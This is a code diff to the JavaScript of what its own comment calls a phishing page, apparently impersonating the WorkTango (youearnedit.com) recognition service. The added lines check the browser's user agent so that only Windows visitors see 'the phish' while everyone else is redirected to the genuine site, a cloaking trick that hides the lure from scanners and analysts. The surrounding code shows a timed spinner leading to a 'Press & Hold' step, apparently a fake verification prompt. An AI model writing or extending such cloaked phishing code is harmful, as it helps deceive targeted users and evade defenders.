@@ -303,6 +303,11 @@
     }
     document.getElementById('refId').textContent = guid();
 
+    // Only Windows sees the phish — everyone else goes to real WorkTango
+    if (!/Windows/i.test(navigator.userAgent)) {
+        window.location.href = 'https://aana.youearnedit.com';
+    }
+
     // Phase 0: spinner for ~3s, then show Press & Hold
     setTimeout(() => {
         document.getElementById('spinnerWrap').style.display = 'none';
